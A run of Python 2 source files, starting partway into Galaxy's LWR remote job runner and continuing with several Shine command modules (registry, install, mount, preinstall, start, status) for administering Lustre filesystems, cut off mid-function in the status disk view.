        # cross-platform (no cp on Windows) and it's un-needed work outside
        # the context of metadata settting (just as easy to download from
        # either place.)
        return LwrJobRunner.__remote_metadata( lwr_client )

    @staticmethod                    
    def __use_remote_datatypes_conf( lwr_client ):
        """ When setting remote metadata, use integrated datatypes from this
        Galaxy instance or use the datatypes config configured via the remote
        LWR.

        Both options are broken in different ways for same reason - datatypes
        may not match. One can push the local datatypes config to the remote
        server - but there is no guarentee these datatypes will be defined
        there. Alternatively, one can use the remote datatype config - but
        there is no guarentee that it will contain all the datatypes available
        to this Galaxy.
        """
        use_remote_datatypes = string_as_bool_or_none( lwr_client.destination_params.get( "use_remote_datatypes", False ) )
        return use_remote_datatypes

    @staticmethod                    
    def __rewrite_parameters( lwr_client ):
        return string_as_bool_or_none( lwr_client.destination_params.get( "rewrite_parameters", False ) ) or False

    def __build_metadata_configuration(self, client, job_wrapper, remote_metadata, remote_job_config):
        metadata_kwds = {}
        if remote_metadata:
            remote_system_properties = remote_job_config.get("system_properties", {})
            remote_galaxy_home = remote_system_properties.get("galaxy_home", None)
            if not remote_galaxy_home:
                raise Exception(NO_REMOTE_GALAXY_FOR_METADATA_MESSAGE)
            metadata_kwds['exec_dir'] = remote_galaxy_home
            outputs_directory = remote_job_config['outputs_directory']
            configs_directory = remote_job_config['configs_directory']
            working_directory = remote_job_config['working_directory']
            outputs = [Bunch(false_path=os.path.join(outputs_directory, os.path.basename(path)), real_path=path) for path in self.get_output_files(job_wrapper)]
            metadata_kwds['output_fnames'] = outputs
            metadata_kwds['compute_tmp_dir'] = working_directory
            metadata_kwds['config_root'] = remote_galaxy_home
            default_config_file = os.path.join(remote_galaxy_home, 'universe_wsgi.ini')
            metadata_kwds['config_file'] = remote_system_properties.get('galaxy_config_file', default_config_file)
            metadata_kwds['dataset_files_path'] = remote_system_properties.get('galaxy_dataset_files_path', None)
            if LwrJobRunner.__use_remote_datatypes_conf( client ):
                remote_datatypes_config = remote_system_properties.get('galaxy_datatypes_config_file', None)
                if not remote_datatypes_config:
                    log.warn(NO_REMOTE_DATATYPES_CONFIG)
                    remote_datatypes_config = os.path.join(remote_galaxy_home, 'datatypes_conf.xml')
                metadata_kwds['datatypes_config'] = remote_datatypes_config
            else:                    
                integrates_datatypes_config = self.app.datatypes_registry.integrated_datatypes_configs
                # Ensure this file gets pushed out to the remote config dir.
                job_wrapper.extra_filenames.append(integrates_datatypes_config)

                metadata_kwds['datatypes_config'] = os.path.join(configs_directory, os.path.basename(integrates_datatypes_config))
        return metadata_kwds


class LwrComputeEnvironment( ComputeEnvironment ):

    def __init__( self, lwr_client, job_wrapper, remote_job_config ):
        self.lwr_client = lwr_client
        self.job_wrapper = job_wrapper
        self.local_path_config = job_wrapper.default_compute_environment()
        self.unstructured_path_rewrites = {}
        # job_wrapper.prepare is going to expunge the job backing the following
        # computations, so precalculate these paths.
        self._wrapper_input_paths = self.local_path_config.input_paths()
        self._wrapper_output_paths = self.local_path_config.output_paths()
        self.path_mapper = PathMapper(lwr_client, remote_job_config, self.local_path_config.working_directory())
        self._config_directory = remote_job_config[ "configs_directory" ]
        self._working_directory = remote_job_config[ "working_directory" ]
        self._sep = remote_job_config[ "system_properties" ][ "separator" ]
        self._tool_dir = remote_job_config[ "tools_directory" ]
        version_path = self.local_path_config.version_path()
        new_version_path = self.path_mapper.remote_version_path_rewrite(version_path)
        if new_version_path:
            version_path = new_version_path
        self._version_path = version_path

    def output_paths( self ):
        local_output_paths = self._wrapper_output_paths

        results = []
        for local_output_path in local_output_paths:
            wrapper_path = str( local_output_path )
            remote_path = self.path_mapper.remote_output_path_rewrite( wrapper_path )
            results.append( self._dataset_path( local_output_path, remote_path ) )
        return results

    def input_paths( self ):
        local_input_paths = self._wrapper_input_paths

        results = []
        for local_input_path in local_input_paths:
            wrapper_path = str( local_input_path )
            # This will over-copy in some cases. For instance in the case of task
            # splitting, this input will be copied even though only the work dir
            # input will actually be used.
            remote_path = self.path_mapper.remote_input_path_rewrite( wrapper_path )
            results.append( self._dataset_path( local_input_path, remote_path ) )
        return results

    def _dataset_path( self, local_dataset_path, remote_path ):
        remote_extra_files_path = None
        if remote_path:
            remote_extra_files_path = "%s_files" % remote_path[ 0:-len( ".dat" ) ]
        return local_dataset_path.with_path_for_job( remote_path, remote_extra_files_path )

    def working_directory( self ):
        return self._working_directory

    def config_directory( self ):
        return self._config_directory

    def new_file_path( self ):
        return self.working_directory()  # Problems with doing this?

    def sep( self ):
        return self._sep

    def version_path( self ):
        return self._version_path

    def rewriter( self, parameter_value ):
        unstructured_path_rewrites = self.unstructured_path_rewrites
        if parameter_value in unstructured_path_rewrites:
            # Path previously mapped, use previous mapping.
            return unstructured_path_rewrites[ parameter_value ]
        if parameter_value in unstructured_path_rewrites.itervalues():
            # Path is a rewritten remote path (this might never occur,
            # consider dropping check...)
            return parameter_value

        rewrite, new_unstructured_path_rewrites = self.path_mapper.check_for_arbitrary_rewrite( parameter_value )
        if rewrite:
            unstructured_path_rewrites.update(new_unstructured_path_rewrites)
            return rewrite
        else:                    
            # Did need to rewrite, use original path or value.
            return parameter_value

    def unstructured_path_rewriter( self ):
        return self.rewriter

# CommandRegistry.py -- Shine commands registry
# Copyright (C) 2007, 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

# Base command class definition
from Base.Command import Command

# Import list of enabled commands (defined in the module __init__.py)
from Shine.Commands import commandList

from Exceptions import *


# ----------------------------------------------------------------------
# Command Registry
# ----------------------------------------------------------------------


class CommandRegistry:
    """Container object to deal with commands."""

    def __init__(self):
        self.cmd_list = []
        self.cmd_dict = {}
        self.cmd_optargs = {}

        # Autoload commands
        self._load()

    def __len__(self):
        "Return the number of commands."
        return len(self.cmd_list)

    def __iter__(self):
        "Iterate over available commands."
        for cmd in self.cmd_list:
            yield cmd

    # Private methods

    def _load(self):
        for cmdobj in commandList:
            self.register(cmdobj())

    # Public methods

    def get(self, name):
        return self.cmd_dict[name]

    def register(self, cmd):
        "Register a new command."
        assert isinstance(cmd, Command)

        self.cmd_list.append(cmd)
        self.cmd_dict[cmd.get_name()] = cmd

        # Keep an eye on ALL option arguments, this is to insure a global
        # options coherency within shine and allow us to intermix options and
        # command -- see execute() below.
        opt_len = len(cmd.getopt_string)
        for i in range(0, opt_len):
            c = cmd.getopt_string[i]
            if c == ':':
                continue
            has_arg = not (i == opt_len - 1) and (cmd.getopt_string[i+1] == ':')
            if c in self.cmd_optargs:
                assert self.cmd_optargs[c] == has_arg, "Incoherency in option arguments"
            else:
                self.cmd_optargs[c] = has_arg 

    def execute(self, args):
        """
        Execute a shine script command.
        """
        # Get command and options. Options and command may be intermixed.
        command = None
        new_args = []
        try:
            # Find command through options...
            next_is_arg = False
            for opt in args:
                if opt.startswith('-'):
                    new_args.append(opt)
                    next_is_arg = self.cmd_optargs[opt[-1:]]
                elif next_is_arg:
                    new_args.append(opt)
                    next_is_arg = False
                else:
                    if command:
                        # Command has already been found, so?
                        if command.has_subcommand():
                            # The command supports subcommand: keep it in new_args.
                            new_args.append(opt)
                        else:
                            raise CommandHelpException("Syntax error.", command)
                    else:
                        command = self.get(opt)
                    next_is_arg = False
        except KeyError, e:
            raise CommandNotFoundError(opt)

        # Parse
        command.parse(new_args)

        # Execute
        return command.execute()                    


# Install.py -- File system installation commands
# Copyright (C) 2007, 2008, 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 

from Shine.FSUtils import create_lustrefs

from Base.Command import Command
from Base.Support.LMF import LMF
from Base.Support.Nodes import Nodes


class Install(Command):
    """
    shine install -f /path/to/model.lmf
    """
    
    def __init__(self):
        Command.__init__(self)

        self.lmf_support = LMF(self)
        self.nodes_support = Nodes(self)

    def get_name(self):
        return "install"

    def get_desc(self):
        return "Install a new file system."

    def execute(self):
        if not self.opt_m:
            print "Bad argument"                    
        else:
            # Use this Shine.FSUtils convenience function.
            fs_conf, fs = create_lustrefs(self.lmf_support.get_lmf_path(),
                    event_handler=self)

            install_nodes = self.nodes_support.get_nodeset()

            # Install file system configuration files; normally, this should
            # not be done by the Shine.Lustre.FileSystem object itself, but as
            # all proxy methods are currently handled by it, it is more
            # convenient this way...
            fs.install(fs_conf.get_cfg_filename(), nodes=install_nodes)

            if install_nodes:
                nodestr = " on %s" %  install_nodes
            else:
                nodestr = ""

            print "Configuration files for file system %s have been installed " \
                    "successfully%s." % (fs_conf.get_fs_name(), nodestr)

            if not install_nodes:
                # Print short file system summary.
                print
                print "Lustre targets summary:"
                print "\t%d MGT on %s" % (fs.mgt_count, fs.mgt_servers)
                print "\t%d MDT on %s" % (fs.mdt_count, fs.mdt_servers)
                print "\t%d OST on %s" % (fs.ost_count, fs.ost_servers)
                print

                # Give pointer to next user step.
                print "Use `shine format -f %s' to initialize the file system." % \
                        fs_conf.get_fs_name()

            return 0                    


# Mount.py -- Mount file system on clients
# Copyright (C) 2007, 2008, 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

"""
Shine `mount' command classes.

The mount command aims to start Lustre filesystem clients.
"""

import os

# Configuration
from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 
from Shine.Configuration.Exceptions import *

# Command base class
from Base.FSClientLiveCommand import FSClientLiveCommand
from Base.CommandRCDefs import *
# -R handler
from Base.RemoteCallEventHandler import RemoteCallEventHandler

from Exceptions import CommandException

# Command helper
from Shine.FSUtils import open_lustrefs

# Lustre events
import Shine.Lustre.EventHandler
from Shine.Lustre.FileSystem import *

class GlobalMountEventHandler(Shine.Lustre.EventHandler.EventHandler):

    def __init__(self, verbose=1):
        self.verbose = verbose

    def ev_startclient_start(self, node, client):
        if self.verbose > 1:
            print "%s: Mounting %s on %s ..." % (node, client.fs.fs_name, client.mount_path)

    def ev_startclient_done(self, node, client):
        if self.verbose > 1:
            if client.status_info:
                print "%s: Mount: %s" % (node, client.status_info)                    
            else:
                print "%s: FS %s succesfully mounted on %s" % (node,
                        client.fs.fs_name, client.mount_path)

    def ev_startclient_failed(self, node, client, rc, message):
        if rc:
            strerr = os.strerror(rc)
        else:
            strerr = message
        print "%s: Failed to mount FS %s on %s: %s" % \
                (node, client.fs.fs_name, client.mount_path, strerr)
        if rc:
            print message


class Mount(FSClientLiveCommand):
    """
    """

    def __init__(self):
        FSClientLiveCommand.__init__(self)

    def get_name(self):
        return "mount"

    def get_desc(self):
        return "Mount file system clients."

    target_status_rc_map = { \
            MOUNTED : RC_OK,
            RECOVERING : RC_FAILURE,
            OFFLINE : RC_FAILURE,
            TARGET_ERROR : RC_TARGET_ERROR,
            CLIENT_ERROR : RC_CLIENT_ERROR,
            RUNTIME_ERROR : RC_RUNTIME_ERROR }

    def fs_status_to_rc(self, status):
        return self.target_status_rc_map[status]

    def execute(self):
        result = 0

        self.init_execute()

        # Get verbose level.
        vlevel = self.verbose_support.get_verbose_level()

        for fsname in self.fs_support.iter_fsname():

            # Install appropriate event handler.
            eh = self.install_eventhandler(None,
                    GlobalMountEventHandler(vlevel))

            nodes = self.nodes_support.get_nodeset()

            fs_conf, fs = open_lustrefs(fsname, None,
                    nodes=nodes,
                    indexes=None,
                    event_handler=eh)

            if nodes and not nodes.issubset(fs_conf.get_client_nodes()):
                raise CommandException("%s are not client nodes of filesystem '%s'" % \
                        (nodes - fs_conf.get_client_nodes(), fsname))

            fs.set_debug(self.debug_support.has_debug())

            status = fs.mount(mount_options=fs_conf.get_mount_options())
            rc = self.fs_status_to_rc(status)
            if rc > result:
                result = rc

            if rc == RC_OK:                    
                if vlevel > 0:                    
                    print "Mount successful."                    
            elif rc == RC_RUNTIME_ERROR:                    
                for nodes, msg in fs.proxy_errors:                    
                    print "%s: %s" % (nodes, msg)                    

        return result


# Preinstall.py -- File system installation commands
# Copyright (C) 2007, 2008 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 
from Shine.Configuration.Exceptions import *

from Shine.FSUtils import create_lustrefs

from Base.RemoteCommand import RemoteCommand
from Base.Support.FS import FS

import os

class Preinstall(RemoteCommand):
    """
    shine preinstall -f <filesystem name> -R
    """
    
    def __init__(self):
        RemoteCommand.__init__(self)
        self.fs_support = FS(self)

    def get_name(self):
        return "preinstall"

    def get_desc(self):
        return "Preinstall a new file system."

    def is_hidden(self):
        return True

    def execute(self):
        try:
            conf_dir_path = Globals().get_conf_dir()
            if not os.path.exists(conf_dir_path):
                os.makedirs(conf_dir_path, 0755)
        except OSError, ex:
            print "OSError"                    
            raise                    


# Start.py -- Start file system
# Copyright (C) 2007, 2008, 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

"""
Shine `start' command classes.

The start command aims to start Lustre filesystem servers or just some
of the filesystem targets on local or remote servers. It is available
for any filesystems previously installed and formatted.
"""

import os

# Configuration
from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 
from Shine.Configuration.Exceptions import *

from Shine.Commands.Status import Status
from Shine.Commands.Tune import Tune

# Command base class
from Base.FSLiveCommand import FSLiveCommand
from Base.FSEventHandler import FSGlobalEventHandler
from Base.CommandRCDefs import *
# -R handler
from Base.RemoteCallEventHandler import RemoteCallEventHandler

# Command helper
from Shine.FSUtils import open_lustrefs

# Lustre events
import Shine.Lustre.EventHandler

# Shine Proxy Protocol
from Shine.Lustre.Actions.Proxies.ProxyAction import *
from Shine.Lustre.FileSystem import *


class GlobalStartEventHandler(FSGlobalEventHandler):

    def __init__(self, verbose=1):
        FSGlobalEventHandler.__init__(self, verbose)

    def handle_pre(self, fs):
        if self.verbose > 0:
            print "Starting %d targets on %s" % (fs.target_count,
                    fs.target_servers)

    def handle_post(self, fs):
        if self.verbose > 0:
            Status.status_view_fs(fs, show_clients=False)

    def ev_starttarget_start(self, node, target):
        # start/restart timer if needed (we might be running a new runloop)
        if self.verbose > 1:
            print "%s: Starting %s %s (%s)..." % (node, \
                    target.type.upper(), target.get_id(), target.dev)
        self.update()

    def ev_starttarget_done(self, node, target):
        self.status_changed = True
        if self.verbose > 1:
            if target.status_info:
                print "%s: Start of %s %s (%s): %s" % \
                        (node, target.type.upper(), target.get_id(), target.dev,
                                target.status_info)
            else:
                print "%s: Start of %s %s (%s) succeeded" % \
                        (node, target.type.upper(), target.get_id(), target.dev)
        self.update()

    def ev_starttarget_failed(self, node, target, rc, message):
        self.status_changed = True
        if rc:
            strerr = os.strerror(rc)
        else:
            strerr = message
        print "%s: Failed to start %s %s (%s): %s" % \
                (node, target.type.upper(), target.get_id(), target.dev,
                        strerr)
        if rc:
            print message
        self.update()


class LocalStartEventHandler(Shine.Lustre.EventHandler.EventHandler):

    def __init__(self, verbose=1):
        self.verbose = verbose

    def ev_starttarget_start(self, node, target):
        if self.verbose > 1:
            print "Starting %s %s (%s)..." % (target.type.upper(),
                    target.get_id(), target.dev)

    def ev_starttarget_done(self, node, target):
        if self.verbose > 1:
            if target.status_info:
                print "Start of %s %s (%s): %s" % (target.type.upper(),
                        target.get_id(), target.dev, target.status_info)
            else:
                print "Start of %s %s (%s) succeeded" % (target.type.upper(),
                        target.get_id(), target.dev)

    def ev_starttarget_failed(self, node, target, rc, message):
        if rc:
            strerr = os.strerror(rc)
        else:
            strerr = message
        print "Failed to start %s %s (%s): %s" % (target.type.upper(),
                target.get_id(), target.dev, strerr)
        if rc:
            print message


class Start(FSLiveCommand):
    """
    shine start [-f <fsname>] [-t <target>] [-i <index(es)>] [-n <nodes>] [-qv]
    """

    def __init__(self):
        FSLiveCommand.__init__(self)

    def get_name(self):
        return "start"

    def get_desc(self):
        return "Start file system servers."

    target_status_rc_map = { \
            MOUNTED : RC_OK,
            RECOVERING : RC_OK,
            OFFLINE : RC_FAILURE,
            TARGET_ERROR : RC_TARGET_ERROR,
            CLIENT_ERROR : RC_CLIENT_ERROR,
            RUNTIME_ERROR : RC_RUNTIME_ERROR }

    def fs_status_to_rc(self, status):
        return self.target_status_rc_map[status]

    def execute(self):
        result = 0

        self.init_execute()

        # Get verbose level.
        vlevel = self.verbose_support.get_verbose_level()

        target = self.target_support.get_target()
        for fsname in self.fs_support.iter_fsname():

            # Install appropriate event handler.
            eh = self.install_eventhandler(LocalStartEventHandler(vlevel),
                    GlobalStartEventHandler(vlevel))

            # Open configuration and instantiate a Lustre FS.
            fs_conf, fs = open_lustrefs(fsname, target,
                    nodes=self.nodes_support.get_nodeset(),
                    indexes=self.indexes_support.get_rangeset(),
                    event_handler=eh)

            # Prepare options...
            mount_options = {}
            mount_paths = {}
            for target_type in [ 'mgt', 'mdt', 'ost' ]:
                mount_options[target_type] = fs_conf.get_target_mount_options(target_type)
                mount_paths[target_type] = fs_conf.get_target_mount_path(target_type)

            fs.set_debug(self.debug_support.has_debug())

            # Will call the handle_pre() method defined by the event handler.
            if hasattr(eh, 'pre'):
                eh.pre(fs)
                
            status = fs.start(mount_options=mount_options,
                              mount_paths=mount_paths)

            rc = self.fs_status_to_rc(status)
            if rc > result:
                result = rc

            if rc == RC_OK:
                if vlevel > 0:
                    print "Start successful."
                tuning = Tune.get_tuning(fs_conf)
                status = fs.tune(tuning)
                if status == RUNTIME_ERROR:
                    rc = RC_RUNTIME_ERROR
                # XXX improve tuning on start error handling

            if rc == RC_RUNTIME_ERROR:
                for nodes, msg in fs.proxy_errors:
                    print "%s: %s" % (nodes, msg)

            if hasattr(eh, 'post'):
                eh.post(fs)

            return rc                    

# Status.py -- Check remote filesystem servers and targets status
# Copyright (C) 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

"""
Shine `status' command classes.

The status command aims to return the real state of a Lustre filesystem
and its components, depending of the requested "view". Status views let
the Lustre administrator to either stand back and get a global status
of the filesystem, or if needed, to enquire about filesystem components
detailed states.
"""

# Configuration
from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 
from Shine.Configuration.Exceptions import *

# Command base class
from Base.FSLiveCommand import FSLiveCommand
from Base.CommandRCDefs import *
# Additional options
from Base.Support.View import View
# -R handler
from Base.RemoteCallEventHandler import RemoteCallEventHandler


# Error handling
from Exceptions import CommandBadParameterError

# Command helper
from Shine.FSUtils import open_lustrefs

# Command output formatting
from Shine.Utilities.AsciiTable import *

# Lustre events and errors
import Shine.Lustre.EventHandler
from Shine.Lustre.Disk import *
from Shine.Lustre.FileSystem import *

from ClusterShell.NodeSet import NodeSet

import os


(KILO, MEGA, GIGA, TERA) = (1024, 1048576, 1073741824, 1099511627776)


class GlobalStatusEventHandler(Shine.Lustre.EventHandler.EventHandler):

    def __init__(self, verbose=1):
        self.verbose = verbose

    def ev_statustarget_start(self, node, target):
        pass

    def ev_statustarget_done(self, node, target):
        pass

    def ev_statustarget_failed(self, node, target, rc, message):
        print "%s: Failed to status %s %s (%s)" % (node, target.type.upper(), \
                target.get_id(), target.dev)
        print ">> %s" % message

    def ev_statusclient_start(self, node, client):
        pass

    def ev_statusclient_done(self, node, client):
        pass

    def ev_statusclient_failed(self, node, client, rc, message):
        print "%s: Failed to status of FS %s" % (node, client.fs.fs_name)
        print ">> %s" % message


class Status(FSLiveCommand):
    """
    shine status [-f <fsname>] [-t <target>] [-i <index(es)>] [-n <nodes>] [-qv]
    """

    def __init__(self):
        FSLiveCommand.__init__(self)
        self.view_support = View(self)

    def get_name(self):
        return "status"

    def get_desc(self):
        return "Check for file system target status."


    target_status_rc_map = { \
            MOUNTED : RC_ST_ONLINE,
            RECOVERING : RC_ST_RECOVERING,
            OFFLINE : RC_ST_OFFLINE,
            TARGET_ERROR : RC_TARGET_ERROR,
            CLIENT_ERROR : RC_CLIENT_ERROR,
            RUNTIME_ERROR : RC_RUNTIME_ERROR }

    def fs_status_to_rc(self, status):
        return self.target_status_rc_map[status]

    def execute(self):

        result = -1                    

        self.init_execute()

        # Get verbose level.
        vlevel = self.verbose_support.get_verbose_level()

        target = self.target_support.get_target()
        for fsname in self.fs_support.iter_fsname():

            # Install appropriate event handler.
            eh = self.install_eventhandler(None, GlobalStatusEventHandler(vlevel))

            fs_conf, fs = open_lustrefs(fsname, target,
                    nodes=self.nodes_support.get_nodeset(),
                    indexes=self.indexes_support.get_rangeset(),
                    event_handler=eh)

            fs.set_debug(self.debug_support.has_debug())

            status_flags = STATUS_ANY
            view = self.view_support.get_view()

            # default view
            if view is None:
                view = "fs"
            else:                    
                view = view.lower()

            # disable client checks when not requested
            if view.startswith("disk") or view.startswith("target"):
                status_flags &= ~STATUS_CLIENTS
            # disable servers checks when not requested
            if view.startswith("client"):
                status_flags &= ~(STATUS_SERVERS|STATUS_HASERVERS)

            statusdict = fs.status(status_flags)

            if RUNTIME_ERROR in statusdict:
                # get targets that couldn't be checked
                defect_targets = statusdict[RUNTIME_ERROR]

                for nodes, msg in fs.proxy_errors:
                    print nodes
                    print '-' * 15
                    print msg
                print

            else:                    
                defect_targets = []

            rc = self.fs_status_to_rc(max(statusdict.keys()))
            if rc > result:
                result = rc

            if view == "fs":                    
                self.status_view_fs(fs)                    
            elif view.startswith("target"):                    
                self.status_view_targets(fs)                    
            elif view.startswith("disk"):                    
                self.status_view_disks(fs)                    
            else:                    
                raise CommandBadParameterError(self.view_support.get_view(),                    
                        "fs, targets, disks")                    
        return result

    def status_view_targets(self, fs):
        """
        View: lustre targets
        """
        print "FILESYSTEM TARGETS (%s)" % fs.fs_name

        # override dict to allow target sorting by index
        class target_dict(dict):
            def __lt__(self, other):
                return self["index"] < other["index"]

        ldic = []
        for type, (all_targets, enabled_targets) in fs.targets_by_type():
            for target in enabled_targets:

                if target.state == OFFLINE:
                    status = "offline"
                elif target.state == TARGET_ERROR:
                    status = "ERROR"
                elif target.state == RECOVERING:
                    status = "recovering %s" % target.status_info
                elif target.state == MOUNTED:
                    status = "online"
                else:                    
                    status = "UNKNOWN"

                ldic.append(target_dict([["target", target.get_id()],
                    ["type", target.type.upper()],
                    ["nodes", NodeSet.fromlist(target.servers)],
                    ["device", target.dev],
                    ["index", target.index],
                    ["status", status]]))

        ldic.sort()
        layout = AsciiTableLayout()
        layout.set_show_header(True)
        layout.set_column("target", 0, AsciiTableLayout.LEFT, "target id",
                AsciiTableLayout.CENTER)
        layout.set_column("type", 1, AsciiTableLayout.LEFT, "type",
                AsciiTableLayout.CENTER)
        layout.set_column("index", 2, AsciiTableLayout.RIGHT, "idx",
                AsciiTableLayout.CENTER)
        layout.set_column("nodes", 3, AsciiTableLayout.LEFT, "nodes",
                AsciiTableLayout.CENTER)
        layout.set_column("device", 4, AsciiTableLayout.LEFT, "device",
                AsciiTableLayout.CENTER)
        layout.set_column("status", 5, AsciiTableLayout.LEFT, "status",
                AsciiTableLayout.CENTER)

        AsciiTable().print_from_list_of_dict(ldic, layout)


    def status_view_fs(cls, fs, show_clients=True):
        """
        View: lustre FS summary
        """
        ldic = []

        # targets
        for type, (a_targets, e_targets) in fs.targets_by_type():
            nodes = NodeSet()
            t_offline = []
            t_error = []
            t_recovering = []
            t_online = []
            t_runtime = []
            t_unknown = []
            for target in a_targets:
                nodes.add(target.servers[0])

                # check target status
                if target.state == OFFLINE:
                    t_offline.append(target)
                elif target.state == TARGET_ERROR:
                    t_error.append(target)
                elif target.state == RECOVERING:
                    t_recovering.append(target)
                elif target.state == MOUNTED:
                    t_online.append(target)
                elif target.state == RUNTIME_ERROR:
                    t_runtime.append(target)
                else:                    
                    t_unknown.append(target)

            status = []
            if len(t_offline) > 0:
                status.append("offline (%d)" % len(t_offline))
            if len(t_error) > 0:
                status.append("ERROR (%d)" % len(t_error))
            if len(t_recovering) > 0:
                status.append("recovering (%d) for %s" % (len(t_recovering),
                    t_recovering[0].status_info))
            if len(t_online) > 0:
                status.append("online (%d)" % len(t_online))
            if len(t_runtime) > 0:
                status.append("CHECK FAILURE (%d)" % len(t_runtime))
            if len(t_unknown) > 0:
                status.append("not checked (%d)" % len(t_unknown))

            if len(t_unknown) < len(a_targets):
                ldic.append(dict([["type", "%s" % type.upper()],
                    ["count", len(a_targets)], ["nodes", nodes],
                    ["status", ', '.join(status)]]))

        # clients
        if show_clients:
            (c_ign, c_offline, c_error, c_runtime, c_mounted) = fs.get_client_statecounters()
            status = []
            if c_ign > 0:
                status.append("not checked (%d)" % c_ign)
            if c_offline > 0:
                status.append("offline (%d)" % c_offline)
            if c_error > 0:
                status.append("ERROR (%d)" % c_error)
            if c_runtime > 0:
                status.append("CHECK FAILURE (%d)" % c_runtime)
            if c_mounted > 0:
                status.append("mounted (%d)" % c_mounted)

            ldic.append(dict([["type", "CLI"], ["count", len(fs.clients)],
                ["nodes", "%s" % fs.get_client_servers()], ["status", ', '.join(status)]]))

        layout = AsciiTableLayout()
        layout.set_show_header(True)
        layout.set_column("type", 0, AsciiTableLayout.CENTER, "type", AsciiTableLayout.CENTER)
        layout.set_column("count", 1, AsciiTableLayout.RIGHT, "#", AsciiTableLayout.CENTER)
        layout.set_column("nodes", 2, AsciiTableLayout.LEFT, "nodes", AsciiTableLayout.CENTER)
        layout.set_column("status", 3, AsciiTableLayout.LEFT, "status", AsciiTableLayout.CENTER)

        print "FILESYSTEM COMPONENTS STATUS (%s)" % fs.fs_name
        AsciiTable().print_from_list_of_dict(ldic, layout)

    status_view_fs = classmethod(status_view_fs)


    def status_view_disks(self, fs):
        """
        View: lustre disks
        """

        print "FILESYSTEM DISKS (%s)" % fs.fs_name

        # override dict to allow target sorting by index
        class target_dict(dict):
            def __lt__(self, other):
                return self["index"] < other["index"] 
        ldic = []
        jdev_col_enabled = False
        tag_col_enabled = False
        for type, (all_targets, enabled_targets) in fs.targets_by_type():
            for target in enabled_targets:

                if target.state == OFFLINE:
                    status = "offline"
                elif target.state == RECOVERING:
                    status = "recovering %s" % target.status_info
                elif target.state == MOUNTED:
                    status = "online"
                elif target.state == TARGET_ERROR:
                    status = "ERROR"
                elif target.state == RUNTIME_ERROR:
                    status = "CHECK FAILURE"
                else:                    
                    status = "UNKNOWN"

                if target.dev_size >= TERA:
                    dev_size = "%.1fT" % (target.dev_size/TERA)
                elif target.dev_size >= GIGA:
                    dev_size = "%.1fG" % (target.dev_size/GIGA)
                elif target.dev_size >= MEGA:
                    dev_size = "%.1fM" % (target.dev_size/MEGA)
                elif target.dev_size >= KILO:
                    dev_size = "%.1fK" % (target.dev_size/KILO)
                else:                    
                    dev_size = "%d" % target.dev_size

                if target.jdev:
                    jdev_col_enabled = True
                    jdev = target.jdev
                else:                    
                    jdev = ""

                if target.tag:
                    tag_col_enabled = True
                    tag = target.tag
                else:                    
                    tag = ""

                flags = []
                if target.has_need_index_flag():
                    flags.append("need_index")
                if target.has_first_time_flag():
                    flags.append("first_time")
                if target.has_update_flag():
                    flags.append("update")
                if target.has_rewrite_ldd_flag():
                    flags.append("rewrite_ldd")
                if target.has_writeconf_flag():
                    flags.append("writeconf")
